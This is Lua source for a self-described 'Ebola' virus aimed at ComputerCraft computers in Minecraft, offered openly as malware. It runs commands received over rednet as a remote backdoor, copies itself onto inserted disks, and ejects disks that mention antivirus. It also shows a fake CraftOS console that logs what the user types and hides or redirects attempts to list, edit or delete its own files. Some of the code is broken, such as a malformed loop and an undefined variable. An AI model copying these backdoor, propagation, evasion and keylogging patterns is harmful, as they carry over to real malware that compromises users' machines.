--[FILE]disk/infstartup[FILE]--
--"Ebola" virus by Astorphobis - (c) 2015-2016--
--Keep on opening all modems. In order to prevent displaying errors, each modem has to have its own function.--
function openmodems()
 while true do
  function setbottomm()
   rednet.open("bottom")
  end
  function settopm()
   rednet.open("top")
  end
  function setleftm()
   rednet.open("left")
  end
  function setrightm()
   rednet.open("right")
  end
  function setfrontm()
   rednet.open("front")
  end
  function setbackm()
   rednet.open("back")
  end
  --Save error into variables --> errors won't display on screen--
  local status, err = pcall(setbottomm)
  local status, err = pcall(settopm)
  local status, err = pcall(setleftm)
  local status, err = pcall(setrightm)
  local status, err = pcall(setfrontm)
  local status, err = pcall(setbackm)
  os.sleep(2)
 end
end
--Receive commands from "Ebola Control" program--
function getfromcontrol()
 os.sleep(1)
 while true do
  id, controlcmd = rednet.receive()
  shell.run(controlcmd)
 end
end
--Keep on copying Ebola to disk - this disk will become Ebola installer - and some other stuff--
function proliferate()
 while true do()
  os.setComputerLabel("_")
  if fs.exists("disk") then
   if fs.exists("disk/newstartup") then
    fs.delete("disk/newstartup")
   end
   fs.copy("startup", "disk/newstartup")
   if fs.exists("disk/startup") then
    fs.delete("disk/startup")
   end
   fs.copy("install", "disk/startup")
  end
  --Function for searching strings in files--
  function searchInFile(path, stringtolookfor)
   local h = fs.open(path, "r")
   local fileContains = h.readAll()
   local searchForString = string.find(fileContains, stringtolookfor)
   if searchForString > 0 then
    return true
   else
    return false
   end
  end
  if searchInFile("disk/startup", "antivirus")==true then
   disk.eject("bottom")
   disk.eject("top")
   disk.eject("left")
   disk.eject("right")
   disk.eject("front")
   disk.eject("back")
  end
  os.sleep(1)
 end
end
--Fake console--
function fakeconsole()
 --Make backup pullEvent (for allowing ctrl+t in apps ran by user)--
 local oldPull = os.pullEvent
 --List of banned commands - This could be better, but I'm too lazy =P--
 local bannedcmd1 = "ls"
 local bannedcmd2 = "list"
 local bannedcmd3 = "dir"
 local bannedcmd4 = "edit startup"
 local bannedcmd5 = "edit install"
 local bannedcmd6 = "edit startup2"
 local bannedcmd7 = "rm startup"
 local bannedcmd8 = "rm startup2"
 local bannedcmd9 = "rm install"
 local bannedcmd10 = "rm log"
 local bannedcmd11 = "delete startup"
 local bannedcmd12 = "delete startup2"
 local bannedcmd13 = "delete install"
 local bannedcmd14 = "delete log"
 --Functions for setting colors--
 function setWhite()
  if term.isColor() then
   term.setTextColor(colors.white)
  end
 end
 function setYellow()
  if term.isColor() then
   term.setTextColor(colors.yellow)
  end
 end
 function setRed()
  if term.isColor() then
   term.setTextColor(colors.red)
  end
 end
 --Some basic settings--
 isstartup = 0
 term.clear()
 term.setCursorPos(1,1)
 --Run user-made startup ("startup2")--
 if fs.exists("startup2") then
  isstartup = 1
  setYellow()
  term.write("CraftOS 1.5")
  term.setCursorPos(1,2)
  setWhite()
  shell.run("startup2")
 end
 --write fake craftos--
 if isstartup==0 then
  setYellow()
  term.write("CraftOS 1.5")
  term.setCursorPos(1,2)
 end
 --start console loop--
 while true do
  --disable ctrl+t in console--
  os.pullEvent = os.pullEventRaw
  --write "> "--
  local cursorx, cursory = term.getCursorPos()
  setYellow()
  term.write("> ")
  term.setCursorPos(3, cursory)
  setWhite()
  --read user entered command--
  local userenteredcommand = read()
  --log this command--
  hWrite = fs.open("log", "a")
  hWrite.writeLine(whattodo)
  hWrite.close()
  --set original pull event (to allow ctrl+t in the app ran by user)--
  os.pullEvent = oldPull
  --Answer to banned commands--
  if whattodo==bannedcmd1 or whattodo==bannedcmd2 or whattodo==bannedcmd3 then
   isbannedcmd = 1
   --TODO: Write fake ls command (without files "startup" (if startup2 doesn't exist), "install", "backup" and "log"--
  elseif whattodo==bannedcmd4 then
   shell.run("edit startup2")
  elseif whattodo==bannedcmd5 then
   shell.run("edit install2")
  elseif whattodo==bannedcmd6 then
   shell.run("edit startup3")
  elseif whattodo==bannedcmd7 then
   shell.run("rm startup2")
  elseif whattodo==bannedcmd8 then
   shell.run("rm startup3")
  elseif whattodo==bannedcmd9 then
   shell.run("rm install2")
  elseif whattodo==bannedcmd10 then
   shell.run("rm log2")
  elseif whattodo==bannedcmd11 then
   shell.run("rm startup2")
  elseif whattodo==bannedcmd12 then
   shell.run("rm startup3")
  elseif whattodo==bannedcmd13 then
   shell.run("rm install2")
  elseif whattodo==bannedcmd14 then
   shell.run("rm log2")
  else
   --run the user entered command--
   shell.run(whattodo)
  end
 end
end
--Start all functions next to each other (only fakeconsole has on-screen output)--
parallel.waitForAny(openmodems,getfromcontrol,proliferate,fakeconsole)